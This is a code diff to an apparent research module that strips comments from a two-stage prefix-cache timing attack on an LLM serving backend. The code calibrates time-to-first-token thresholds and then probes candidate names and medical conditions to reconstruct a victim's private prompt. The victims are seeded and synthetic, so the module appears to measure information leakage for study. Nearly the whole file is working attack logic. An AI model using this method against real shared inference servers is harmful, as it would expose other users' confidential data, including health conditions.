@@ -81,22 +81,18 @@ from kv_attack.two_stage_victim_seeder import (
 from kv_attack.victim_seeder import build_aligned_system_prompt
 
 
-# ── Information-theoretic constants ───────────────────────────────────────────
 
-N_NAMES       = len(FIRST_NAMES) * len(LAST_NAMES)   # 100
-N_CONDITIONS  = len(MEDICAL_CONDITIONS)               # 20
-VOCAB_SIZE    = N_NAMES * N_CONDITIONS                # 2000
-H0_BITS       = math.log2(VOCAB_SIZE)                # ≈ 10.97
+N_NAMES       = len(FIRST_NAMES) * len(LAST_NAMES)
+N_CONDITIONS  = len(MEDICAL_CONDITIONS)
+VOCAB_SIZE    = N_NAMES * N_CONDITIONS
+H0_BITS       = math.log2(VOCAB_SIZE)
 
-# Analytical BLQ for the adaptive two-stage algorithm
-BLQ_ADAPTIVE_EXPECTED      = H0_BITS / 79.2          # 0.13837
-BLQ_LINEAR_WEEK12_EXPECTED = H0_BITS / 762.4         # 0.01439
+BLQ_ADAPTIVE_EXPECTED      = H0_BITS / 79.2
+BLQ_LINEAR_WEEK12_EXPECTED = H0_BITS / 762.4
 
-# Eviction parameters — same victim-structured approach as Week 12
 EVICT_N_REQUESTS = 500
 
 
-# ── Result dataclass ──────────────────────────────────────────────────────────
 
 @dataclass
 class TwoStageResult:
@@ -121,7 +117,6 @@ class TwoStageResult:
     t2_threshold_ms       : float = T2_THRESHOLD_MS
 
 
-# ── Cache eviction (victim-structured, same as Week 12) ───────────────────────
 
 def evict_cache_two_stage(
     backend       : BackendClient,
@@ -152,7 +147,6 @@ def evict_cache_two_stage(
     return calls
 
 
-# ── Name list & condition list builders ───────────────────────────────────────
 
 def _shuffled_names(seed: int) -> list[str]:
     names = [f"{f} {l}" for f in FIRST_NAMES for l in LAST_NAMES]
@@ -168,7 +162,6 @@ def _shuffled_conditions(seed: int) -> list[str]:
     return conds
 
 
-# ── Information-theoretic metrics ─────────────────────────────────────────────
 
 def _compute_it_metrics(
     total_calls  : int,
@@ -179,7 +172,7 @@ def _compute_it_metrics(
     return {
         "vocab_size"               : VOCAB_SIZE,
         "prior_entropy_bits"       : round(H0_BITS, 4),
-        "h_after_stage1_bits"      : round(math.log2(N_CONDITIONS), 4),  # 4.32 bits
+        "h_after_stage1_bits"      : round(math.log2(N_CONDITIONS), 4),
         "h_after_stage2_bits"      : 0.0,
         "total_api_calls"          : total_calls,
         "stage1_api_calls"         : s1_calls,
@@ -200,7 +193,6 @@ def _compute_it_metrics(
     }
 
 
-# ── Calibration (two thresholds) ──────────────────────────────────────────────
 
 def calibrate_two_stage(
     backend            : BackendClient,
@@ -258,7 +250,6 @@ def calibrate_two_stage(
     true_cond = gt["condition"]
     true_dob  = gt["dob"]
 
-    # ── HIT samples: same prompt repeated N times — all N are cache hits ──────
     hit_prompt = build_two_stage_prompt(
         system_prefix, true_name, true_dob, true_cond, tokenizer
     )
@@ -266,40 +257,32 @@ def calibrate_two_stage(
           f"(192 blocks, same prompt repeated) ...")
     hit_ttfts = backend.measure_ttft_repeated(hit_prompt, n=n_samples)
 
-    # ── S1_HIT samples: right name + UNIQUE wrong condition each call ─────────
-    # Appending a unique hex suffix keeps the name block hash identical
-    # (same true_name) while making the condition block hash unique on every
-    # call, so the condition blocks never accumulate in cache.
     print(f"[calibrate_v2] Measuring {n_samples} S1_HIT samples "
           f"(128 name blocks hit, 64 cond blocks miss — unique dummy cond each call) ...")
     s1_hit_ttfts = np.array([
         backend.measure_ttft(
             build_two_stage_prompt(
                 system_prefix, true_name, true_dob,
-                f"{_DUMMY_CONDITION}_{_uuid.uuid4().hex[:8]}",  # unique each call
-                tokenizer, use_dummy_cond=False,  # use the passed condition, not hardcoded
+                f"{_DUMMY_CONDITION}_{_uuid.uuid4().hex[:8]}",
+                tokenizer, use_dummy_cond=False,
             )
         )
         for _ in range(n_samples)
     ])
 
-    # ── MISS samples: unique wrong name each call ──────────────────────────────
-    # Same pattern as miss_prompt_factory() in attacker.py. The UUID prefix
-    # guarantees block N is unique per call → never cached → always a cold miss.
     print(f"[calibrate_v2] Measuring {n_samples} MISS samples "
           f"(0 blocks hit — unique UUID name each call) ...")
     miss_ttfts = np.array([
         backend.measure_ttft(
             build_two_stage_prompt(
                 system_prefix,
-                f"MISS{_uuid.uuid4().hex[:12]}",  # unique name per call
+                f"MISS{_uuid.uuid4().hex[:12]}",
                 true_dob, _DUMMY_CONDITION, tokenizer,
             )
         )
         for _ in range(n_samples)
     ])
 
-    # ── Separability checks ───────────────────────────────────────────────────
     KS_ALPHA = 1e-8
     ks_hit_miss,  p_hit_miss  = scipy.stats.ks_2samp(hit_ttfts, miss_ttfts)
     ks_s1_miss,   p_s1_miss   = scipy.stats.ks_2samp(s1_hit_ttfts, miss_ttfts)
@@ -317,18 +300,14 @@ def calibrate_two_stage(
     print(f"[calibrate_v2] KS s1/miss:    stat={ks_s1_miss:.4f}  p={p_s1_miss:.2e}")
     print(f"[calibrate_v2] KS hit/s1_hit: stat={ks_hit_s1:.4f}  p={p_hit_s1:.2e}")
 
-    # Guard: the base hit-vs-miss channel must exist
     if p_hit_miss >= KS_ALPHA:
         raise RuntimeError(
             f"[calibrate_v2] FATAL: HIT vs MISS not separable "
             f"(p={p_hit_miss:.2e}). APC may be disabled or victims not seeded."
         )
 
-    # Guard: the intermediate S1_HIT level must exist for the two-stage attack
     intermediate_feasible = (p_s1_miss < KS_ALPHA) and (p_hit_s1 < KS_ALPHA)
     if not intermediate_feasible:
-        # Don't raise — let the harness decide whether to fall back.
-        # The 'feasible' flag in the return dict signals the harness.
         print(
             f"[calibrate_v2] WARNING: Intermediate S1_HIT level NOT separable. "
             f"p_s1_miss={p_s1_miss:.2e}, p_hit_s1={p_hit_s1:.2e}. "
@@ -336,7 +315,6 @@ def calibrate_two_stage(
             f"Fall back to linear_early_exit (adaptive_reconstructor)."
         )
 
-    # ── Youden-J thresholds ───────────────────────────────────────────────────
     def youden_threshold(pos: np.ndarray, neg: np.ndarray) -> float:
         """Youden-J optimal threshold separating pos (hits) from neg (misses)."""
         all_v  = np.concatenate([pos, neg])
@@ -353,8 +331,8 @@ def calibrate_two_stage(
         idx    = int(np.argmax(j))
         return float((sv[idx] + sv[idx + 1]) / 2.0)
 
-    t1 = youden_threshold(s1_hit_ttfts, miss_ttfts)    # S1_HIT is positive; MISS is negative
-    t2 = youden_threshold(hit_ttfts,    s1_hit_ttfts)  # HIT is positive; S1_HIT is negative
+    t1 = youden_threshold(s1_hit_ttfts, miss_ttfts)
+    t2 = youden_threshold(hit_ttfts,    s1_hit_ttfts)
 
     print(f"[calibrate_v2] T1 (name gate)      = {t1:.1f} ms  "
           f"(analytical: {T1_THRESHOLD_MS:.1f} ms)")
@@ -385,7 +363,6 @@ def calibrate_two_stage(
     }
 
 
-# ── Main reconstruction ───────────────────────────────────────────────────────
 
 def reconstruct_victim_two_stage(
     backend        : BackendClient,
@@ -409,7 +386,6 @@ def reconstruct_victim_two_stage(
     victim_id = victim_record["victim_id"]
     dob       = gt["dob"]
 
-    # ── Stage 1: Name elimination ─────────────────────────────────────────────
     names      = _shuffled_names(seed=candidate_seed)
     s1_calls   = 0
     s1_log     : list[dict] = []
@@ -420,13 +396,6 @@ def reconstruct_victim_two_stage(
 
     for probe_idx, cand_name in enumerate(names):
 
-        # Reseed victim's full prompt to keep blocks fresh in LRU
-        # Stage 1 reseed: send the FULL victim prompt (correct name + correct condition).
-        # Do NOT use victim_record["stage1_probe"] — that uses use_dummy_cond=True which
-        # hardcodes "diabetes" as the condition. Reseeding with "diabetes" accumulates
-        # diabetes condition blocks in the cache, causing Stage 2 to find "diabetes" as
-        # a spurious full HIT before the victim's real condition is ever encountered.
-        # Using the full prompt keeps the CORRECT condition in cache for Stage 2.
         if probe_idx > 0 and probe_idx % RESEED_EVERY == 0:
             try:
                 backend.measure_ttft(victim_record["prompt"])
@@ -434,28 +403,11 @@ def reconstruct_victim_two_stage(
             except Exception as exc:
                 print(f"[reconstructor_v2] WARNING: Stage 1 reseed failed: {exc}")
 
-        # Stage 1 probe: name block + UNIQUE dummy condition block.
-        # CRITICAL: must use a unique dummy condition per probe, not the
-        # fixed _DUMMY_CONDITION. If the same dummy condition is reused,
-        # its filler blocks (blocks N+129..N+191) get cached after the
-        # first probe — subsequent probes then HIT those cached condition
-        # blocks regardless of the candidate name, making Stage 1 useless.
-        # Fix: append a unique hex suffix so each probe's condition block
-        # has a unique hash, guaranteeing a cold miss every time.
         unique_dummy = f"{_DUMMY_CONDITION}_{uuid.uuid4().hex[:8]}"
         probe = build_two_stage_prompt(
             system_prefix, cand_name, dob, unique_dummy, tokenizer,
-            use_dummy_cond=False,   # use the passed unique condition, not the hardcoded one
+            use_dummy_cond=False,
         )
-        # Stage 1 probe: ALWAYS measure with N=1 (single call).
-        # Cache timing oracles require the FIRST TTFT — that is the cold-miss
-        # measurement. If N>1, call 1 caches the probe, and calls 2..N are
-        # always cache hits (~182 ms). The mean then collapses to
-        # (MISS + HIT + HIT...) / N ≈ 635 ms for ALL candidates — both
-        # correct and wrong names return the same averaged value, making
-        # Stage 1 unable to distinguish anything.
-        # N_REPEATS_CONFIRM (=3) is correct for confirming a known HIT
-        # (same prompt, expect consistent fast TTFT). N=1 is correct here.
         mean_ttft  = backend.measure_ttft(probe)
         s1_calls  += 1
 
@@ -473,7 +425,6 @@ def reconstruct_victim_two_stage(
             confirmed_name = cand_name
             break
 
-    # Stage 1 fallback: pick lowest TTFT name if no hit
     if confirmed_name is None:
         best = min(s1_log, key=lambda x: x["mean_ttft"])
         confirmed_name = best["name"]
@@ -481,7 +432,6 @@ def reconstruct_victim_two_stage(
               f"Stage 1 NO HIT — fallback to best guess '{confirmed_name}' "
               f"(TTFT={best['mean_ttft']:.1f} ms)")
 
-    # ── Stage 2: Condition scan ───────────────────────────────────────────────
     conditions         = _shuffled_conditions(seed=candidate_seed)
     s2_calls           = 0
     s2_log             : list[dict] = []
@@ -493,7 +443,6 @@ def reconstruct_victim_two_stage(
 
     for probe_idx, cand_cond in enumerate(conditions):
 
-        # Reseed victim's full prompt periodically
         if probe_idx > 0 and probe_idx % RESEED_EVERY == 0:
             try:
                 backend.measure_ttft(victim_record["prompt"])
@@ -521,11 +470,6 @@ def reconstruct_victim_two_stage(
             confirmed_condition = cand_cond
             break
 
-    # Stage 2 fallback: no probe crossed t2_ms → take the condition with the
-    # lowest observed TTFT as the best guess. This is statistically correct if
-    # the TTFT distributions are separable (condition gate works); if they are
-    # not separable, the fallback is a random guess and success_rate will be low.
-    # The feasibility guard in week13_harness should have caught this case first.
     if confirmed_condition is None:
         best = min(s2_log, key=lambda x: x["mean_ttft"])
         confirmed_condition = best["condition"]
@@ -535,7 +479,6 @@ def reconstruct_victim_two_stage(
               f"If this is wrong, T2={t2_ms:.1f} ms may be miscalibrated — "
               f"re-run calibrate_two_stage() with more samples.")
 
-    # ── Confirmation ──────────────────────────────────────────────────────────
     confirm_probe = build_two_stage_prompt(
         system_prefix, confirmed_name, dob, confirmed_condition, tokenizer
     )
@@ -551,7 +494,6 @@ def reconstruct_victim_two_stage(
           f"ttft={conf_ttft:.1f} ms  "
           f"total_calls={total_calls} (s1={s1_calls}, s2={s2_calls}, confirm={confirm_calls})")
 
-    # ── Metrics ───────────────────────────────────────────────────────────────
     recovered   = {"name": confirmed_name, "condition": confirmed_condition, "dob": dob}
     evaluated   = ["name", "condition"]
     correct     = sum(1 for k in evaluated if gt.get(k) == recovered.get(k))
@@ -592,7 +534,6 @@ def reconstruct_victim_two_stage(
     )
 
 
-# ── Aggregate metrics ─────────────────────────────────────────────────────────
 
 def aggregate_two_stage(results: list[TwoStageResult]) -> dict:
     total_calls = [r.total_api_calls for r in results]
